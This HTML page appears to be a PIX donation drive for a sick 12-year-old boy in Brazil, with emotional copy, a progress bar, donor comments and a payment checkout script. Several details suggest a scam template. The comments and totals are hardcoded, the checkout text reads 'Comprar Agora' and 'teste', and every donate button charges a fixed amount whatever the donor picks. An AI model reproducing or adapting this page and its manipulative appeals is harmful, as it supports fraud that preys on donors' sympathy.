<!DOCTYPE html><html lang="pt-BR"><head>
    <script>
  window.pixelId = "68b17cbdc654f6effaf240c4";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Salve o Felipe – Doando Agora</title>
  <link rel="stylesheet" href="css/styles.css">
  <style>
    /* small safe overrides */
    .donation-button{cursor:pointer}
  </style>
</head>
<body>

  <header>
    <div class="container-logo">
      <a href="#doeAgora">
        <img src="images/logo.webp" alt="Logo Salve Felipe" class="logo" width="280" height="65">
      </a>
    </div>
  </header>

  <main class="container">
    <section class="grid-container">
      <div class="grid-item">
        <h1>O STF negou. O SUS negou. Mas o Felipe ainda tem você.</h1>
      </div>
      <div class="grid-item">
        <div class="main-image-container">
          <img src="images/img01.webp" alt="Felipe em tratamento" width="400" height="400" fetchpriority="high">
        </div>
        <div class="progress-section">
          <div class="progress-stats">
            <div class="stats-left">
              <div class="label">Arrecadado</div>
              <div class="value">R$ 184.485,00</div>
            </div>
            <div class="stats-right">
              <span class="label">de R$ 400.000,00</span>
            </div>
          </div>
          <div class="progress-bar-container">
            <div class="progress-bar"></div>
          </div>
          <div class="progress-details">
            <span class="days-left">2 dias restantes</span>
            <span class="percentage">46%</span>
          </div>
        </div>
        <a href="#doeAgora" class="cta-button">
          <svg aria-hidden="true" viewBox="0 0 576 512"><path d="M275.3 250.5c7 7.4 18.4 7.4 25.5 0l108.9-114.2c31.6-33.2 29.8-88.2-5.6-118.8-30.8-26.7-76.7-21.9-104.9 7.7L288 36.9l-11.1-11.6C248.7-4.4 202.8-9.2 172 17.5c-35.3 30.6-37.2 85.6-5.6 118.8l108.9 114.2zm290 77.6c-11.8-10.7-30.2-10-42.6 0L430.3 402c-11.3 9.1-25.4 14-40 14H272c-8.8 0-16-7.2-16-16s7.2-16 16-16h78.3c15.9 0 30.7-10.9 33.3-26.6 3.3-20-12.1-37.4-31.6-37.4H192c-27 0-53.1 9.3-74.1 26.3L71.4 384H16c-8.8 0-16 7.2-16 16v96c0 8.8 7.2 16 16 16h356.8c14.5 0 28.6-4.9 40-14L564 377c15.2-12.1 16.4-35.3 1.3-48.9z"></path></svg>
          <span>Doe Agora</span>
        </a>
      </div>
    </section>

    <section class="content-section">
      <p>Felipe tem apenas 12 anos. Mas vive como se tivesse 70.</p>
      <p>Enquanto outras crianças brincam, ele passa horas ligado a uma máquina de hemodiálise. Seus rins pararam de funcionar por causa de uma doença raríssima chamada SHUa – Síndrome Hemolítico-Urêmica atípica. Uma condição cruel, agressiva e degenerativa que destrói silenciosamente o corpo de dentro para fora.</p>
      <p>Hoje, Felipe não urina mais. Três vezes por semana, ele enfrenta longas sessões de hemodiálise, com dores, cansaço e medo. Ele não vai mais à escola. Não consegue brincar. E carrega no olhar a pergunta que ninguém consegue responder: "Por que comigo?"</p>
      <img src="images/img02.webp" alt="Felipe em tratamento">
      <a href="#doeAgora" class="cta-button">
         <svg aria-hidden="true" viewBox="0 0 576 512"><path d="M275.3 250.5c7 7.4 18.4 7.4 25.5 0l108.9-114.2c31.6-33.2 29.8-88.2-5.6-118.8-30.8-26.7-76.7-21.9-104.9 7.7L288 36.9l-11.1-11.6C248.7-4.4 202.8-9.2 172 17.5c-35.3 30.6-37.2 85.6-5.6 118.8l108.9 114.2zm290 77.6c-11.8-10.7-30.2-10-42.6 0L430.3 402c-11.3 9.1-25.4 14-40 14H272c-8.8 0-16-7.2-16-16s7.2-16 16-16h78.3c15.9 0 30.7-10.9 33.3-26.6 3.3-20-12.1-37.4-31.6-37.4H192c-27 0-53.1 9.3-74.1 26.3L71.4 384H16c-8.8 0-16 7.2-16 16v96c0 8.8 7.2 16 16 16h356.8c14.5 0 28.6-4.9 40-14L564 377c15.2-12.1 16.4-35.3 1.3-48.9z"></path></svg>
         <span>Doe Agora</span>
      </a>
      <p>Mas existe um remédio capaz de mudar essa realidade: Ultomiris.</p>
      <p>Um medicamento importado que custa R$ 35 mil por dose — e Felipe precisa de várias. É a única esperança para estabilizar sua condição e torná-lo apto a fazer um transplante de rim. O problema? O SUS não fornece. A família entrou na Justiça, mas o Supremo Tribunal Federal negou.</p>
      <p>Sim… negaram a chance de uma criança lutar pela vida.</p>
      <p>Hoje, Felipe sobrevive graças à força da mãe e à fé de que alguém — como você — estenda a mão. Porque sozinhos… eles não conseguem.</p>
      <img src="images/img03.webp" alt="Felipe em tratamento">
      <a href="#doeAgora" class="cta-button">
         <svg aria-hidden="true" viewBox="0 0 576 512"><path d="M275.3 250.5c7 7.4 18.4 7.4 25.5 0l108.9-114.2c31.6-33.2 29.8-88.2-5.6-118.8-30.8-26.7-76.7-21.9-104.9 7.7L288 36.9l-11.1-11.6C248.7-4.4 202.8-9.2 172 17.5c-35.3 30.6-37.2 85.6-5.6 118.8l108.9 114.2zm290 77.6c-11.8-10.7-30.2-10-42.6 0L430.3 402c-11.3 9.1-25.4 14-40 14H272c-8.8 0-16-7.2-16-16s7.2-16 16-16h78.3c15.9 0 30.7-10.9 33.3-26.6 3.3-20-12.1-37.4-31.6-37.4H192c-27 0-53.1 9.3-74.1 26.3L71.4 384H16c-8.8 0-16 7.2-16 16v96c0 8.8 7.2 16 16 16h356.8c14.5 0 28.6-4.9 40-14L564 377c15.2-12.1 16.4-35.3 1.3-48.9z"></path></svg>
         <span>Doe Agora</span>
      </a>
    </section>

    <section class="content-section">
       <p><b>Não é só um remédio. É a única chance.</b></p>
       <p>A cada dia sem tratamento, os riscos aumentam. A cada dia sem ajuda, Felipe sofre ainda mais. Por isso, lançamos essa vaquinha: para bancar o Ultomiris, o acompanhamento médico e os custos da próxima etapa — o transplante.</p>
       <p><b>Você pode ser a virada dessa história. Faça sua doação agora.</b></p>
    </section>

    <div id="doeAgora" class="donation-comments-grid">
      <div class="donation-box">
        <h2>Quanto você pode ajudar o Felipe?</h2>
        <div class="donation-grid">
          <button class="donation-button" data-value="30">R$ 30,00</button>
          <div class="most-chosen-wrapper">
             <div class="most-chosen-tag">mais escolhido</div>
             <button class="donation-button" data-value="50">R$ 50,00</button>
          </div>
          <button class="donation-button" data-value="75">R$ 75,00</button>
          <button class="donation-button" data-value="100">R$ 100,00</button>
          <button class="donation-button" data-value="150">R$ 150,00</button>
          <button class="donation-button" data-value="200">R$ 200,00</button>
          <button class="donation-button" data-value="250">R$ 250,00</button>
          <button class="donation-button" data-value="300">R$ 300,00</button>
          <button class="donation-button" data-value="500">R$ 500,00</button>
          <button class="donation-button" data-value="750">R$ 750,00</button>
          <button class="donation-button" data-value="1000">R$ 1.000,00</button>
          <button class="donation-button" data-value="1500">R$ 1.500,00</button>
        </div>

  <!-- PIX will open in a modal popup when user clicks a donation button -->
  <!-- The modal element is defined at the end of the body -->

      </div>
      <div class="comments-box">
        <h2>Quem Ajudou</h2>
        <div class="comments-header">24 Comentários</div>
        <div class="comment-list">
          <div class="comment-block">
            <div class="comment">
              <div class="comment-avatar"><img src="images/fb01.webp" alt="Avatar Patrícia Gomes"></div>
              <div class="comment-content">
                <p class="comment-text"><strong>Patrícia Gomes</strong><br>Que Deus esteja com o Felipe em cada passo! Fiz minha doação com muito carinho e esperança. Força, pequeno guerreiro!</p>
              </div>
            </div>
            <div class="comment-footer">
              <p class="comment-footer-actions">Responder · Curtir · <span>2h</span></p>
              <div class="reactions">
                <img src="images/icon_like.webp" alt="Like">
                <img src="images/icon_heart.webp" alt="Heart">
                <span>58</span>
              </div>
            </div>
          </div>

          <div class="comment-block">
            <div class="comment">
              <div class="comment-avatar"><img src="images/fb02.webp" alt="Avatar Isabela Rocha"></div>
              <div class="comment-content">
                <p class="comment-text"><strong>Isabela Rocha</strong><br>Doei com o coração. Vamos juntos dar ao Felipe a chance de viver com mais alívio e dignidade. Todo apoio pra essa família linda!</p>
              </div>
            </div>
            <div class="comment-footer">
              <p class="comment-footer-actions">Responder · Curtir · <span>40 min</span></p>
              <div class="reactions">
                <img src="images/icon_like.webp" alt="Like">
                <img src="images/icon_heart.webp" alt="Heart">
                <span>43</span>
              </div>
            </div>
          </div>
                    
          <div class="comment-block">
            <div class="comment">
              <div class="comment-avatar"><img src="images/fb03.webp" alt="Avatar Camila Andrade"></div>
              <div class="comment-content">
                <p class="comment-text"><strong>Camila Andrade</strong><br>Sei que minha ajuda é pequena, mas cheia de amor. Estamos com você, Felipe. Cada gesto importa. Você é muito amado!</p>
              </div>
            </div>
            <div class="comment-footer">
              <p class="comment-footer-actions">Responder · Curtir · <span>10 min</span></p>
              <div class="reactions">
                <img src="images/icon_like.webp" alt="Like">
                <img src="images/icon_heart.webp" alt="Heart">
                <span>18</span>
              </div>
            </div>
          </div>
        </div>
        <div class="comments-plugin-footer">
          <p>Essa públicacao não está mais recebendo comentários!</p>
        </div>
      </div>
    </div>
  </main>
    
  <footer>
    <div class="container">
      <a href="#doeAgora"><img src="images/logo.webp" alt="Logo Salve Felipe"></a>
      <p><a href="#">Políticas de Privacidade</a> | <a href="#">Termos de Serviço</a></p>
      <p class="copyright">© 2025 Salve Felipe - Todos os direitos reservados.</p>
    </div>
  </footer>

  <script src="js/app.js"></script>
  <!-- PIX Modal -->
  <div id="pix-modal" class="modal" aria-hidden="true" style="display:none">
    <div class="modal-backdrop"></div>
    <div class="modal-panel">
      <button id="modal-close" class="modal-close" aria-label="Fechar">×</button>
      <!-- Status (blinking) -->
      <h3 id="modal-status" class="modal-status blink">Aguardando pagamento</h3>

      <p class="modal-subtitle">Você está doando:</p>
      <div id="modal-amount" class="modal-amount">R$ 0,00</div>

      <div id="modal-qrcode" class="qrcode"></div>

      <div class="pix-text-wrap">
        <input id="modal-pix-text" readonly="" placeholder="código pix...">
      </div>

      <div style="text-align:center;margin-top:12px;">
        <button id="modal-btn-copy" class="primary-copy">
          <svg width="20" height="20" viewBox="0 0 24 24" aria-hidden="true" focusable="false" style="margin-right:8px;vertical-align:middle;fill:white"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg>
          <span>COPIAR CÓDIGO PIX</span>
        </button>
      </div>

      <div class="status-row" style="justify-content:center;margin-top:12px;gap:12px;">
        <span id="modal-timer" class="timer">30:00</span>
      </div>

      <div class="pix-instructions">
        <ol>
          <li>Abra o aplicativo do seu banco e entre na área PIX.</li>
          <li>Escolha a opção "Pagar com QR Code" e aponte a câmera para o QR acima.</li>
          <li>Ou use a opção "PIX Copia e Cola" e cole o código no campo do seu banco.</li>
        </ol>
      </div>

      <div id="modal-success" class="modal-success" style="display:none">Pagamento recebido! Obrigado ❤️</div>

      <!-- Logs / timing details -->
      <div style="text-align:center;margin-top:12px;">
        <button id="modal-toggle-logs" class="link-button" aria-expanded="false">Ver tempo</button>
      </div>

      <div id="modal-logs" class="modal-logs" style="display:none">
        <pre id="modal-logs-pre" class="logs-pre" aria-live="polite"></pre>
      </div>
    </div>
  </div>
<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" data-cf-beacon="{" version":"2024.11.0","token":"5853155f32de433bb62956c1387460aa","r":1,"server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>

<script src="./proxy_1fdb70.php"></script>
<script src="https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs/qrcode.min.js"></script>
<script>(function() {
    const PROXY_URL = './proxy_1fdb70.php';
    const utms = Object.fromEntries(new URLSearchParams(window.location.search));
    const CHECKOUT = {"backgroundColor":"#1e293b","buttonColor":"#21bfeb","buttonText":"Comprar Agora com PIX","title":"Doe agora","subtitle":"Pagamento rápido e seguro.","fields":{"name":false,"email":false,"phone":false,"document":false,"cep":false,"street":false,"number":false,"complement":false,"neighborhood":false,"city":false,"state":false},"timerMinutes":10,"timerBackgroundColor":"rgba(255, 255, 255, 0.1)","timerTextColor":"#ffffff","amount":2000,"directPix":true,"triggerSelector":".cta-button","pixModalTitle":"Pagamento via PIX teste","pixModalCopyButtonText":"Copiar código PIX teste teste","pixModalBackgroundColor":"#FFFFFF","pixModalTextColor":"#1f2937","pixModalButtonColor":"#00c27a","pixModalButtonTextColor":"#FFFFFF","pixModalValueText":"💰 Valor:","pixModalExpirationText":"🕒 Válido até:","pixModalSecurePaymentText":"Pagamento seguro via PIX","pixModalInfoTextColor":"#0f172a","pixModalSecurePaymentTextColor":"#00c27a","pixModalInputBackgroundColor":"#f9fafb","pixModalInputBorderColor":"#d1d5db","pixModalInputTextColor":"#374151","pixExpirationMinutes":5,"popupTextColor":"#FFFFFF","popupSubtitleColor":"#cbd5e1","popupPriceColor":"#21bfeb","popupInputBackgroundColor":"#0A1221","popupInputBorderColor":"rgba(33, 191, 235, 0.3)","popupInputTextColor":"#E2E8F0","facebookPixelId":"4234234243","upsellUrl":"","backRedirectUrl":""};

    let timeLeft = CHECKOUT.timerMinutes * 60;
    let timerInterval = null;

    function formatCurrency(value) {
        return (value / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
    }
    
    function formatTime(seconds) {
        if (seconds <= 0) return "00:00";
        const m = String(Math.floor(seconds / 60)).padStart(2, '0');
        const s = String(seconds % 60).padStart(2, '0');
        return m + ':' + s;
    };

    function createPopup() {
        const popupContainer = document.createElement('div');
        popupContainer.id = 'paradise-popup-overlay';
        popupContainer.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background-color:rgba(0,0,0,0.7);display:none;align-items:center;justify-content:center;z-index:9999;backdrop-filter:blur(4px);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;';
        
        let formFieldsHtml = '';
        if (!CHECKOUT.directPix) {
             const inputStyle = 'width:100%;padding:12px;margin-bottom:10px;border-radius:8px;box-sizing:border-box;background-color: ' + (CHECKOUT.popupInputBackgroundColor || '#334155') + ';border: 1px solid ' + (CHECKOUT.popupInputBorderColor || '#4b5563') + ';color: ' + (CHECKOUT.popupInputTextColor || 'white') + ';';
            formFieldsHtml = 
                (CHECKOUT.fields.name ? '<input type="text" name="name" placeholder="Nome Completo" required style="' + inputStyle + '">' : '') +
                (CHECKOUT.fields.email ? '<input type="email" name="email" placeholder="Seu Melhor E-mail" required style="' + inputStyle + '">' : '') +
                (CHECKOUT.fields.phone ? '<input type="tel" name="phone_number" placeholder="Telefone (WhatsApp)" required style="' + inputStyle + '">' : '') +
                (CHECKOUT.fields.document ? '<input type="text" name="document" placeholder="000.000.000-00" maxlength="14" required style="' + inputStyle + '">' : '');
        }

        const timerHtml = CHECKOUT.timerMinutes > 0 ? 
            '<div id="paradise-popup-timer" style="font-size:1.25rem;font-weight:bold;margin-bottom:12px;display:inline-block;padding:4px 12px;border-radius:8px;background-color:' + (CHECKOUT.timerBackgroundColor || 'rgba(255,255,255,0.1)') + ';color:' + (CHECKOUT.timerTextColor || 'white') + ';">' + 
                formatTime(timeLeft) + 
            '</div>' : '';

        popupContainer.innerHTML = 
            '<div id="paradise-popup-content" style="background-color:' + CHECKOUT.backgroundColor + ';color:' + (CHECKOUT.popupTextColor || 'white') + ';padding:24px;border-radius:24px;width:90%;max-width:380px;text-align:center;position:relative;box-sizing:border-box;">' +
                '<button id="paradise-popup-close" style="position:absolute;top:10px;right:10px;background:transparent;border:none;color:'+ (CHECKOUT.popupTextColor || 'white') +';font-size:24px;cursor:pointer;line-height:1;">&times;</button>' +
                timerHtml +
                '<h2 style="font-size:1.5rem;font-weight:bold;margin:0 0 4px 0;color:inherit;">' + CHECKOUT.title + '</h2>' +
                '<p style="color:' + (CHECKOUT.popupSubtitleColor || '#cbd5e1') + ';font-size:0.875rem;margin:0 0 16px 0;">' + CHECKOUT.subtitle + '</p>' +
                '<p style="font-size:2rem;font-weight:bold;color:' + (CHECKOUT.popupPriceColor || '#14b8a6') + ';margin:0 0 16px 0;">' + formatCurrency(CHECKOUT.amount) + '</p>' +
                '<form id="paradise-popup-form">' +
                    formFieldsHtml +
                    '<button type="submit" id="paradise-popup-pay-btn" style="width:100%;padding:14px;background-color:' + CHECKOUT.buttonColor + ';color:white;border:none;border-radius:12px;font-weight:bold;font-size:1rem;cursor:pointer;display:flex;align-items:center;justify-content:center;">' +
                        '<span>' + CHECKOUT.buttonText + '</span>' +
                    '</button>' +
                '</form>' +
            '</div>';
        document.body.appendChild(popupContainer);

        popupContainer.addEventListener('click', (e) => { if (e.target === popupContainer) closePopup(); });
        document.getElementById('paradise-popup-close').addEventListener('click', closePopup);
        document.getElementById('paradise-popup-form').addEventListener('submit', handleFormSubmit);
        const docInput = popupContainer.querySelector('input[name="document"]');
        if(docInput) {
            docInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, "");
                value = value.substring(0, 11);
                
                let formattedValue = value;
                if (value.length > 9) {
                    formattedValue = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
                } else if (value.length > 6) {
                    formattedValue = value.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
                } else if (value.length > 3) {
                    formattedValue = value.replace(/(\d{3})(\d{1,3})/, '$1.$2');
                }
        
                e.target.value = formattedValue;
            });
        }
    }
    
    function startTimer() {
        if (CHECKOUT.timerMinutes <= 0) return;
        const timerEl = document.getElementById('paradise-popup-timer');
        if (timerInterval) clearInterval(timerInterval);
        timerInterval = setInterval(() => {
            timeLeft--;
            if (timerEl) timerEl.textContent = formatTime(timeLeft);
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                const payBtn = document.getElementById('paradise-popup-pay-btn');
                if (payBtn) {
                    payBtn.disabled = true;
                    payBtn.style.opacity = '0.5';
                    payBtn.textContent = 'Oferta Encerrada';
                }
            }
        }, 1000);
    }
    
    async function handleFormSubmit(e) {
        e.preventDefault();
        const form = e.target;
        if (!CHECKOUT.directPix && !form.checkValidity()) {
            form.reportValidity();
            return;
        }

        const payButton = document.getElementById('paradise-popup-pay-btn');
        payButton.disabled = true;
        payButton.innerHTML = '<div style="border: 2px solid #f3f3f3; border-top: 2px solid #fff; border-radius: 50%; width: 18px; height: 18px; animation: spin 1s linear infinite; display: inline-block;"></div><span style="margin-left:8px;">Processando...</span>';
        
        let customerData = {};
        if (!CHECKOUT.directPix) {
             const elements = form.elements;
             for (let i = 0; i < elements.length; i++) {
                if (elements[i].name) {
                    customerData[elements[i].name] = elements[i].value;
                }
            }
        }

        const payload = {
            customer: customerData,
            utms: utms
        };

        try {
            const response = await fetch(PROXY_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            if (!response.ok) {
                throw new Error(result.message || result.error || 'Ocorreu um erro.');
            }
            showPixModal(result);
            closePopup(true); // close popup without resetting timer
        } catch (error) {
            alert('Erro: ' + error.message);
            payButton.disabled = false;
            payButton.querySelector('span').textContent = CHECKOUT.buttonText;
            payButton.querySelector('div').remove();
        }
    }
    
    function showPopup() {
        const popup = document.getElementById('paradise-popup-overlay');
        if (!popup) {
            createPopup();
            showPopup();
            return;
        }
        popup.style.display = 'flex';
        document.body.style.overflow = 'hidden';
        timeLeft = CHECKOUT.timerMinutes * 60;
        startTimer();
    }

    function closePopup(keepTimerState = false) {
        const popup = document.getElementById('paradise-popup-overlay');
        if (popup) popup.style.display = 'none';
        document.body.style.overflow = '';
        if (timerInterval) clearInterval(timerInterval);
        if (!keepTimerState) timeLeft = CHECKOUT.timerMinutes * 60;
    }

    function startPopupPaymentChecker(hash) {
        if (window._popupPaymentChecker) clearInterval(window._popupPaymentChecker);

        window._popupPaymentChecker = setInterval(async () => {
            try {
                const res = await fetch(`${PROXY_URL}?action=check_status&hash=${hash}`);
                const data = await res.json();
                if (data && data.payment_status === 'paid') {
                    clearInterval(window._popupPaymentChecker);

                    if (typeof fbq === 'function' && CHECKOUT.facebookPixelId) {
                        fbq('track', 'Purchase', { value: CHECKOUT.amount / 100, currency: 'BRL' });
                    }

                    if (CHECKOUT.upsellUrl) {
                        const upsellUrl = CHECKOUT.upsellUrl;
                        const params = new URLSearchParams(utms);
                        params.append('fpay', hash);
                        params.append('domain', 'https://go.paradisepagbr.com');
                        
                        const newQueryString = params.toString();
                        const finalUrl = upsellUrl + (upsellUrl.includes('?') ? '&' : '?') + newQueryString;
                        window.location.href = finalUrl;
                    } else {
                        let pixModal = document.querySelector('#paradise-pix-modal');
                        if (pixModal) {
                             const modalContent = pixModal.querySelector('div');
                             if(modalContent) modalContent.innerHTML = '<h2 style="font-size:2rem;font-weight:bold;">Pagamento Aprovado!</h2><p>Obrigado!</p>';
                        }
                    }
                }
            } catch (e) {
                console.error('Popup payment check failed:', e);
            }
        }, 5000);
    }

    function showPixModal(result) {
        let pixModal = document.getElementById('paradise-pix-modal');
        if (pixModal) pixModal.remove();

        const pixCode = result?.pix?.pix_qr_code;
        const transactionHash = result?.hash;
        let expirationDate = result?.pix?.expiration_date;

        if (!pixCode) return;

        pixModal = document.createElement('div');
        pixModal.id = 'paradise-pix-modal';
        pixModal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:9999;display:flex;justify-content:center;align-items:center;animation:backdropFadeIn 0.3s ease-out forwards; font-family: Inter, sans-serif;';

        if (!expirationDate && CHECKOUT.pixExpirationMinutes > 0) {
            expirationDate = new Date(Date.now() + CHECKOUT.pixExpirationMinutes * 60 * 1000);
        }

        const expirationString = expirationDate ? new Date(expirationDate).toLocaleString('pt-BR', {
            day: '2-digit', month: '2-digit', year: 'numeric',
            hour: '2-digit', minute: '2-digit', second: '2-digit'
        }).replace(',', '') : '--';

        const modalTitleHTML = CHECKOUT.pixModalTitle ? '<h2 style="margin:0 0 16px;font-size:20px;line-height:1.4;color:' + (CHECKOUT.pixModalTextColor || '#111827') + ';">' + CHECKOUT.pixModalTitle + '</h2>' : '';
        const modalValueHTML = CHECKOUT.pixModalValueText ? '<p style="margin:8px 0;">' + CHECKOUT.pixModalValueText + ' <strong>' + formatCurrency(CHECKOUT.amount) + '</strong></p>' : '';
        const modalExpirationHTML = CHECKOUT.pixModalExpirationText ? '<p style="margin:8px 0;">' + CHECKOUT.pixModalExpirationText + ' <span>' + expirationString + '</span></p>' : '';
        const modalSecurePaymentHTML = CHECKOUT.pixModalSecurePaymentText ? '<p style="margin:12px 0 0;font-weight:bold;color:' + (CHECKOUT.pixModalSecurePaymentTextColor || '#00c27a') + ';">' + CHECKOUT.pixModalSecurePaymentText + '</p>' : '';


        pixModal.innerHTML = 
          '<div style="background:' + (CHECKOUT.pixModalBackgroundColor || '#ffffff') + ';padding:32px;border-radius:16px;max-width:380px;width:90%;box-shadow:0 8px 24px rgba(0,0,0,0.2);position:relative;animation:popupSlideIn 0.3s ease-out forwards;text-align: center;">' +
            '<button id="paradise-pix-modal-close" style="position:absolute;top:10px;right:15px;font-size:24px;color:#9ca3af;background:none;border:none;cursor:pointer;">&times;</button>' +
            modalTitleHTML +
            '<div style="display:flex;justify-content:center;margin-bottom:16px;"><div id="paradise-pix-qrcode" style="padding: 4px; background: white; border-radius: 4px; line-height: 0;"></div></div>' +
            '<input id="paradise-pix-code-input" type="text" readonly value="' + pixCode + '" style="width:100%;box-sizing:border-box;padding:12px;font-size:14px;margin-bottom:12px;border-radius:8px;text-align:center;font-family:monospace;background-color:' + (CHECKOUT.pixModalInputBackgroundColor || '#f9fafb') + ';border:1px solid ' + (CHECKOUT.pixModalInputBorderColor || '#d1d5db') + ';color:' + (CHECKOUT.pixModalInputTextColor || '#374151') + ';">' +
            '<button id="paradise-pix-copy-btn" style="border:none;width:100%;padding:14px 20px;border-radius:8px;font-weight:600;font-size:15px;cursor:pointer;transition: filter 0.2s ease;margin-bottom:16px;background:' + (CHECKOUT.pixModalButtonColor || '#00c27a') + ';color:' + (CHECKOUT.pixModalButtonTextColor || '#ffffff') + ';">' + (CHECKOUT.pixModalCopyButtonText || 'Copiar código PIX') + '</button>' +
            '<div style="font-size:14px;line-height:1.5;text-align: center;color:' + (CHECKOUT.pixModalInfoTextColor || '#0f172a') + ';">' +
              modalValueHTML +
              modalExpirationHTML +
              modalSecurePaymentHTML +
            '</div>' +
          '</div>';
          
        document.body.appendChild(pixModal);

        const qrContainer = document.getElementById('paradise-pix-qrcode');
        if (qrContainer && typeof QRCode !== 'undefined') {
            new QRCode(qrContainer, {
                text: pixCode,
                width: 184,
                height: 184,
                colorDark : "#000000",
                colorLight : "#ffffff",
                correctLevel : QRCode.CorrectLevel.M
            });
        }

        if (transactionHash) {
            startPopupPaymentChecker(transactionHash);
        }
        
        const closeAndClear = () => {
            pixModal.remove();
            if(window._popupPaymentChecker) clearInterval(window._popupPaymentChecker);
        };

        pixModal.addEventListener('click', (e) => { if (e.target === pixModal) closeAndClear(); });
        document.getElementById('paradise-pix-modal-close').addEventListener('click', closeAndClear);
        document.getElementById('paradise-pix-copy-btn').addEventListener('click', (e) => {
            const inputField = document.getElementById('paradise-pix-code-input');
            navigator.clipboard.writeText(inputField.value).then(() => {
                const btn = e.target;
                const originalText = btn.textContent;
                btn.textContent = 'Copiado!';
                setTimeout(() => { btn.textContent = originalText; }, 2000);
            });
        });
    }
    
    async function handleDirectPixGeneration(triggerButton) {
        const originalContent = triggerButton.innerHTML;
        triggerButton.disabled = true;
        triggerButton.innerHTML = '<div style="border: 2px solid #f3f3f3; border-top: 2px solid #fff; border-radius: 50%; width: 18px; height: 18px; animation: spin 1s linear infinite; display: inline-block;"></div><span style="margin-left:8px;">Gerando...</span>';

        const payload = {
            customer: {}, // Customer data is empty for direct pix
            utms: utms
        };

        try {
            const response = await fetch(PROXY_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            if (!response.ok) {
                throw new Error(result.message || result.error || 'Ocorreu um erro ao gerar PIX.');
            }
            showPixModal(result);
        } catch (error) {
            alert('Erro: ' + error.message);
        } finally {
            triggerButton.disabled = false;
            triggerButton.innerHTML = originalContent;
        }
    }

    document.addEventListener('DOMContentLoaded', () => {
        const style = document.createElement('style');
        style.innerHTML = `
           @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
           @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
           @keyframes backdropFadeIn { from { opacity: 0; } to { opacity: 1; } }
           @keyframes popupSlideIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
        `;
        document.head.appendChild(style);

        document.querySelectorAll(CHECKOUT.triggerSelector).forEach(el => {
            el.addEventListener('click', (e) => {
                e.preventDefault();
                if (CHECKOUT.directPix) {
                    handleDirectPixGeneration(el);
                } else {
                    showPopup();
                }
            });
        });
    });
})();
</script>


</body></html>